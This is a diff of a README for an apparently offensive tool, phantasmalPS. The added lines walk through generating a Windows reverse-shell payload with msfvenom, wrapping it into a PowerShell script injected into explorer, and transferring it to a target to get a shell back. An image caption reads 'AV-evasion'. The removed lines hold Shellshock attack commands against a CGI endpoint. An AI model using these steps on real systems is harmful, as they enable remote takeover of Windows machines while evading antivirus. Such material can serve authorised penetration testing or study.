@@ -6,24 +6,30 @@ Install requirements:
 pip3 install -r requirements.txt
 ```
 
-Simple Usage:
+## Simple Usage:
 ```bash
 python3 phantasmalPS.py -h
 ```
 ![Help](Images/phantasmalPS-help.png)
 
+First generate a shellcode within your favorite C2 framework:
 ```bash
-python3 effectiveShellShocker.py test http://172.16.80.22 /cgi-bin /calendar.cgi
+msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport 8443 -f ps1 -o shell
 ```
-![Test](Images/test.png)
-
+Let phantasmalPS do its magic:
 ```bash
-python3 effectiveShellShocker.py attack http://172.16.80.22 /cgi-bin /calendar.cgi
+python3 phantasmalPS.py -f shell -p explorer
 ```
-![Attack](Images/attack.png)
+![Run](Images/run-phantasmalPS.png)
 
-Reverse shell:
+It generates a PowerShell file called "simplescript.ps1" n the same directory you downloaded phantasmalPS.py:
+```bash
+ls -l simplescript.ps1
+```
+![Attack](Images/file-check.png)
 
-![Reverse Shell](Images/reverseshell.png)
+Now, transfer the PowerShell script to a Windows machine and get a shell back:
+
+![Reverse Shell](Images/AV-evasion.png)
 
 Thank you
